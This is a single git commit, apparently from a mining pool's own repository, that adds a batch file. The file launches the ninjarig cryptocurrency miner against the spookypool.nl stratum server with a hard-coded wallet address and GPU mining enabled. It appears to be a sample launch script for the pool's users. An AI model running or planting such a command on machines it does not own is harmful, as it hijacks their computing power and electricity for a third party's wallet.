ef30a9b8fdcecf10e742c3b198b992978b08f113
SpookyPool <vbemailhacker@gmail.com>
2020-03-11 21:08:09 +0100

    Main

---
+++ src/assets/run.bat
@@ -0,0 +1,1 @@
+ninjarig --donate-level 1 -a chukwa -o stratum+tcp://spookypool.nl:11333 -u TktSXcbDqr7bgia66Vc3LmW5zU1xWEQ58Rug6n1NBfTXDS1i9upNd628yLq8mFML4WDbaocUHL6s53dwToKHkfiPbAD5MkG8HLv -p x -t 2 --use-gpu OPENCL,CUDA
